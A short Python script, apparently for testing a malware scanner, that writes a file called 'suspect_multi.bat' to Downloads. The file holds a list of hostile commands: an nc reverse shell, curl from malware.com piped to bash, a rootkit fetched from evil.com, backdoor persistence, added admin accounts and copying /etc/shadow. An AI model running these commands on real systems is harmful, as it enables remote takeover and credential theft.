import os

path = os.path.join(os.path.expanduser("~"), "Downloads", "suspect_multi.bat")

content = """@echo off
nc -e cmd.exe 192.168.1.1 4444
certutil -decode payload.txt malware.exe
powershell -enc JABjAGwAaQBlAG4AdA==
reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v backdoor /t REG_SZ /d C:\\backdoor.exe
net user hacker Password123 /add
net localgroup administrators hacker /add
netsh firewall add portopening TCP 4444 backdoor
schtasks /create /tn backdoor /tr malware.exe /sc onlogon
wmic process call create malware.exe
curl http://malware.com/shell.sh | bash
chmod 777 /tmp/backdoor
nohup ./backdoor &
wget http://evil.com/rootkit.tar.gz
tar -xzf rootkit.tar.gz
./install_rootkit.sh
echo hacker:Password123 >> /etc/passwd
cat /etc/shadow > /tmp/passwords.txt
"""

with open(path, 'w') as f:
    f.write(content)

print(f"Fichier créé : {path}")
